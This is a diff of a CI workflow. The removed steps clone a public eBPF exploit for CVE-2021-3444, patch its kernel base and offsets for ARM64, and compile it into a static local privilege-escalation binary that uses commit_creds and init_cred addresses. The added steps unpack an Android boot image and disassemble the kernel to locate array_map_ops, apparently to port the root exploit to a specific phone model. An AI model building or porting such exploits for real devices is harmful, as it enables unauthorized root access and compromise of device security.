@@ -1,49 +1,28 @@
-name: build_ebpf_lpe_arm64
+name: find_ops_offset
 on: [push, workflow_dispatch]
 
 jobs:
-  build:
-    runs-on: ubuntu-24.04-arm
+  find:
+    runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout M36-TempRoot
+        uses: actions/checkout@v4
 
-      - name: Install dependencies
+      - name: Prepare kernel.elf
         run: |
-          sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y gcc make git
+          unzip boot_a.zip
+          git clone https://android.googlesource.com/platform/system/tools/mkbootimg
+          PYTHONPATH=mkbootimg python3 mkbootimg/unpack_bootimg.py --boot_img boot_a.img --out boot_unpacked
+          cd boot_unpacked
+          cp kernel kernel_raw.gz && gunzip kernel_raw.gz
+          pip3 install vmlinux-to-elf
+          vmlinux-to-elf kernel_raw kernel.elf
 
-      - name: Clone and patch exploit
+      - name: Install binutils
+        run: sudo apt-get update && sudo apt-get install -y binutils-aarch64-linux-gnu
+
+      - name: Find where array_map_ops is written
         run: |
-          git clone https://github.com/Botti01/eBPF-CVE-exploitation.git
-          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
-          
-          echo "=== Before patch ==="
-          grep -E "KERNEL_BASE|BPF_ARRAY_VALUE_OFFSET|OPS_OFFSET" exploit.c
-          
-          # Patch plain #defines for ARM64
-          sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
-          sed -i 's|#define BPF_ARRAY_VALUE_OFFSET 208|#define BPF_ARRAY_VALUE_OFFSET 0x140|' exploit.c
-          sed -i 's|#define OPS_OFFSET 304|#define OPS_OFFSET 704|' exploit.c
-          
-          echo "=== After patch ==="
-          grep -E "KERNEL_BASE|BPF_ARRAY_VALUE_OFFSET|OPS_OFFSET" exploit.c
-
-      - name: Compile with ARM64 symbol addresses
-        run: |
-          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
-          gcc -static -O2 -I ../../../common/include \
-            -DDYN_ARRAY_MAP_OPS=0xffffff8008f5d500ULL \
-            -DDYN_ARRAY_OF_MAPS_MAP_OPS=0xffffff8008f5d780ULL \
-            -DDYN_FD_ARRAY_MAP_DELETE_ELEM=0xffffff80081d6cecULL \
-            -DDYN_COMMIT_CREDS=0xffffff80080e03dcULL \
-            -DDYN_INIT_CRED=0xffffff8009787f48ULL \
-            exploit.c -o exploit
-          
-          file exploit
-          ls -la exploit
-
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: ebpf-lpe-arm64
-          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit
+          cd boot_unpacked
+          echo "=== Looking for array_map_ops address (ffffff8008f5d500) ==="
+          aarch64-linux-gnu-objdump -d kernel.elf | grep -B 3 -A 3 "ffffff8008f5d500" | head -n 40
